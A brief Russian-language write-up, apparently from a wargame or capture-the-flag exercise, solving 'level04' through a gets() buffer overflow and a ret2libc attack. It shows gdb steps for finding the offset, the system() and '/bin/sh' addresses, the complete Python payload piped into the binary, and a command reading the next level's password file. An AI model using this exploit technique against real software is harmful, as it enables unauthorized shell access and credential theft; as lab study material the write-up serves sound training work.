По псевдокоду ясно, что у нас есть уязвимость с возможностью переполнения gets.

Запускаем gdb и устанавливаем параметр set follow-fork-mode child.
Теперь мы можем получить сегу при переполнении буфера и увидеть адрес памяти на котором все поломалось.

Благодаря сайту https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
генерируем длиную строку, которая явно превышает буфер.
После сеги получаем адрес памяти по которому определяем смещение
для вызова system через указание адреса памяти.

Нам нужны 2 адреса:
- функция libc system().
- строка '/bin/sh'.

gdb поможет их найти:

p system
0xf7e6aed0

find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec

Используем эти адреса и немного мусора.

(python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + '\xff\xff\xff\xff' + '\xec\x97\xf8\xf7'" ; cat) | ./level04
cat /home/users/level05/.pass